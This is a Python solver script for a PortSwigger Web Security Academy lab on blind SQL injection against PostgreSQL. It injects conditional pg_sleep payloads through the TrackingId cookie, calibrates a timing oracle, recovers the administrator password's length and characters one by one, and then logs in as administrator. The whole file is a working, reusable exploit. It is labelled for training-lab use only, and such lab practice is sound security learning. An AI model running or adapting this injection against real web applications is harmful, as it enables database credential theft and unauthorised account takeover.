"""
PortSwigger Web Security Academy — Lab 14
Blind SQL injection: time delays and information retrieval (PostgreSQL).

Use only against your own active PortSwigger lab.
Dependency: requests

Example:
  python3 -m pip install requests
  python3 lab-14-time-delay-info-retrieval.py \
      "https://YOUR-LAB-ID.web-security-academy.net/" -p 127.0.0.1:8080
"""

import argparse
import string
import sys
import time
import requests
import urllib3
from requests.exceptions import ConnectionError, Timeout, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def print_banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║  Lab 14 – Blind SQL Injection (Time Delays + Information)       ║
║  PortSwigger Web Security Academy | PostgreSQL                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")


def log_info(message):
    print(f"{YELLOW}[*] {message}{RESET}")


def log_success(message):
    print(f"{GREEN}[✓] {message}{RESET}")


def log_error(message):
    print(f"{RED}[✗] {message}{RESET}")


def log_detail(message):
    print(f"{CYAN}[>] {message}{RESET}")


def build_proxies(proxy):
    if proxy:
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def get_session(url, proxy=None, timeout=20):
    """Fetch homepage and collect the site's current TrackingId/session cookies."""
    log_info("Establishing session...")
    try:
        response = requests.get(
            url, verify=False, proxies=build_proxies(proxy), timeout=timeout
        )
    except ConnectionError:
        log_error("Connection failed. Check the lab URL and Burp proxy.")
        sys.exit(1)
    except Timeout:
        log_error("Baseline request timed out.")
        sys.exit(1)
    except RequestException as exc:
        log_error(f"Request failed: {exc}")
        sys.exit(1)

    tracking_id = None
    session_cookie = None
    for cookie in response.cookies:
        if cookie.name.lower() == "trackingid":
            tracking_id = cookie.value
        elif cookie.name.lower() == "session":
            session_cookie = cookie.value

    if not tracking_id:
        log_error("Could not find a TrackingId cookie in the response.")
        log_detail("Open the lab in your browser and confirm it is active.")
        sys.exit(1)

    log_success(f"TrackingId acquired ({len(tracking_id)} characters)")
    log_success(f"Session cookie: {'found' if session_cookie else 'not found'}")
    log_detail(f"Baseline response: HTTP {response.status_code}, {len(response.content)} bytes")
    return tracking_id, session_cookie


def make_payload(tracking_id, condition, sleep_seconds):
    """
    Build the PostgreSQL conditional-delay payload.

    The encoded %3B is the SQL statement separator. '+' represents spaces.
    Keep the original TrackingId prefix because the application expects a
    valid-looking cookie value before the injected SQL.
    """
    sql = (
        "x'%3BSELECT+CASE+WHEN+(" + condition + ")"
        "+THEN+pg_sleep(" + str(sleep_seconds) + ")"
        "+ELSE+pg_sleep(0)+END--"
    )
    return sql


def inject(url, tracking_id, session_cookie, condition, proxy=None,
           timeout=20, threshold=7, sleep_seconds=10, label="condition"):
    """Send one timing test. Returns (is_slow, elapsed_seconds)."""
    proxies = build_proxies(proxy)
    payload = make_payload(tracking_id, condition, sleep_seconds)
    cookies = {"TrackingId": payload}
    if session_cookie:
        cookies["session"] = session_cookie

    log_detail(f"Test: {label}")
    log_detail(f"Condition: {condition}")
    start = time.perf_counter()
    try:
        response = requests.get(
            url, cookies=cookies, verify=False, proxies=proxies, timeout=timeout
        )
    except Timeout:
        log_error(f"Request timed out after {timeout}s.")
        raise
    except RequestException as exc:
        log_error(f"HTTP request failed: {exc}")
        raise

    elapsed = time.perf_counter() - start
    is_slow = elapsed >= threshold
    status = f"{GREEN}SLOW / likely TRUE{RESET}" if is_slow else f"{RED}FAST / likely FALSE{RESET}"
    print(f"    HTTP {response.status_code} | {len(response.content)} bytes | {elapsed:.2f}s | {status}")
    return is_slow, elapsed


def calibrate(url, tracking_id, session_cookie, proxy, timeout, threshold, sleep_seconds):
    print(f"\n{CYAN}{BOLD}── Step 2: Calibrate timing oracle ──{RESET}")
    log_info(f"True condition should delay about {sleep_seconds} seconds.")
    true_slow, true_time = inject(
        url, tracking_id, session_cookie, "1=1", proxy, timeout, threshold,
        sleep_seconds, "Calibration TRUE (1=1)"
    )
    log_info("False condition should return without the intentional delay.")
    false_slow, false_time = inject(
        url, tracking_id, session_cookie, "1=2", proxy, timeout, threshold,
        sleep_seconds, "Calibration FALSE (1=2)"
    )

    if not true_slow or false_slow or (true_time - false_time) < (threshold - 1):
        log_error("Calibration failed: the responses did not show a clear timing difference.")
        log_detail("Check the outgoing TrackingId cookie in Burp Repeater.")
        log_detail("Expected: 1=1 takes around 10 seconds; 1=2 responds quickly.")
        log_detail("If both are fast, the payload may not be reaching the SQL query as intended.")
        return False

    log_success(f"Timing oracle calibrated (true={true_time:.2f}s, false={false_time:.2f}s).")
    return True


def find_password_length(url, tracking_id, session_cookie, proxy=None,
                         timeout=20, threshold=7, sleep_seconds=10, max_length=40):
    """Binary-search the administrator password length."""
    print(f"\n{CYAN}{BOLD}── Step 3: Determine password length ──{RESET}")
    log_info("Searching for the administrator password length...")
    low, high = 1, max_length

    while low < high:
        mid = (low + high) // 2
        condition = (
            f"LENGTH((SELECT password FROM users "
            f"WHERE username='administrator'))>{mid}"
        )
        slow, _ = inject(
            url, tracking_id, session_cookie, condition, proxy, timeout,
            threshold, sleep_seconds, f"Is password length > {mid}?"
        )
        if slow:
            low = mid + 1
        else:
            high = mid

    # Confirm the exact length rather than trusting binary search alone.
    condition = (
        f"LENGTH((SELECT password FROM users "
        f"WHERE username='administrator'))={low}"
    )
    confirmed, _ = inject(
        url, tracking_id, session_cookie, condition, proxy, timeout,
        threshold, sleep_seconds, f"Confirm password length = {low}"
    )
    if not confirmed:
        log_error("Could not confirm password length.")
        sys.exit(1)

    log_success(f"Administrator password length: {low}")
    return low


def extract_password(url, tracking_id, session_cookie, length, proxy=None,
                     timeout=20, threshold=7, sleep_seconds=10, charset=None):
    """Extract password character by character using conditional delays."""
    print(f"\n{CYAN}{BOLD}── Step 4: Extract password ──{RESET}")
    charset = charset or (string.ascii_lowercase + string.digits)
    log_info(f"Charset: {charset}")
    password = ""

    for pos in range(1, length + 1):
        found = False
        log_info(f"Testing position {pos}/{length}...")
        for char in charset:
            safe_char = char.replace("'", "''")
            condition = (
                "SUBSTRING((SELECT password FROM users "
                "WHERE username='administrator'),"
                f"{pos},1)='{safe_char}'"
            )
            slow, _ = inject(
                url, tracking_id, session_cookie, condition, proxy, timeout,
                threshold, sleep_seconds, f"Position {pos}, character {char!r}"
            )
            if slow:
                password += char
                progress = password + "·" * (length - len(password))
                sys.stdout.write(
                    f"\r{YELLOW}[*] Password: {GREEN}{password}{YELLOW}{'·' * (length - len(password))}{RESET}"
                )
                sys.stdout.flush()
                found = True
                break

        if not found:
            print()
            log_error(f"No matching character found at position {pos}.")
            log_detail("Try a wider --charset, or check the timing signal and payload in Burp.")
            sys.exit(1)

    print()
    print(f"{GREEN}{BOLD}[✓] Recovered password: {password}{RESET}")
    return password


def login(url, password, proxy=None, timeout=20):
    """Attempt to log in as administrator."""
    print(f"\n{CYAN}{BOLD}── Step 5: Log in as administrator ──{RESET}")
    proxies = build_proxies(proxy)
    login_url = url.rstrip("/") + "/login"
    session = requests.Session()

    try:
        response = session.get(login_url, verify=False, proxies=proxies, timeout=timeout)
        csrf = None
        marker = 'name="csrf" value="'
        if marker in response.text:
            csrf = response.text.split(marker, 1)[1].split('"', 1)[0]

        data = {"username": "administrator", "password": password}
        if csrf:
            data["csrf"] = csrf

        result = session.post(
            login_url, data=data, verify=False, proxies=proxies,
            timeout=timeout, allow_redirects=True
        )
    except RequestException as exc:
        log_error(f"Login request failed: {exc}")
        return

    if "Your username is: administrator" in result.text or "Log out" in result.text:
        log_success("Login appears successful! Check the lab page for the solved status.")
    else:
        log_info("Login was submitted. Check the lab page to confirm completion.")


def main():
    parser = argparse.ArgumentParser(
        description="Lab 14: blind SQL injection via conditional time delays."
    )
    parser.add_argument("url", help="Full URL of your active PortSwigger lab")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT", help="Optional Burp proxy")
    parser.add_argument("--timeout", type=float, default=20, help="HTTP timeout seconds (default: 20)")
    parser.add_argument("--threshold", type=float, default=7, help="Slow response threshold (default: 7)")
    parser.add_argument("--sleep", type=int, default=10, help="Database sleep seconds (default: 10)")
    parser.add_argument("--max-length", type=int, default=40, help="Maximum password length (default: 40)")
    parser.add_argument("--charset", default=string.ascii_lowercase + string.digits,
                        help="Characters to test (default: lowercase letters and digits)")
    parser.add_argument("--no-login", action="store_true", help="Only extract; do not attempt login")
    args = parser.parse_args()
    url = args.url.rstrip("/")

    if not url.startswith(("http://", "https://")):
        parser.error("URL must start with http:// or https://")
    if args.timeout <= args.sleep:
        parser.error("--timeout must be greater than --sleep")
    if args.threshold >= args.sleep:
        parser.error("--threshold must be less than --sleep")
    if args.max_length < 1 or not args.charset:
        parser.error("--max-length and --charset must not be empty/zero")

    print_banner()
    print(f"{YELLOW}[*] Target : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy  : {args.proxy if args.proxy else 'disabled'}{RESET}")
    print(f"{YELLOW}[*] Timeout: {args.timeout}s | Threshold: {args.threshold}s | Sleep: {args.sleep}s{RESET}")
    print(f"{YELLOW}[*] Scope  : use only against your own active PortSwigger lab{RESET}\n")

    tracking_id, session_cookie = get_session(url, args.proxy, args.timeout)

    try:
        if not calibrate(url, tracking_id, session_cookie, args.proxy,
                         args.timeout, args.threshold, args.sleep):
            sys.exit(2)

        length = find_password_length(
            url, tracking_id, session_cookie, args.proxy, args.timeout,
            args.threshold, args.sleep, args.max_length
        )
        password = extract_password(
            url, tracking_id, session_cookie, length, args.proxy,
            args.timeout, args.threshold, args.sleep, args.charset
        )

        if not args.no_login:
            login(url, password, args.proxy, args.timeout)
    except Timeout:
        log_error("A request timed out. Increase --timeout or inspect Burp/network latency.")
        sys.exit(1)
    except RequestException:
        sys.exit(1)


if __name__ == "__main__":
    main()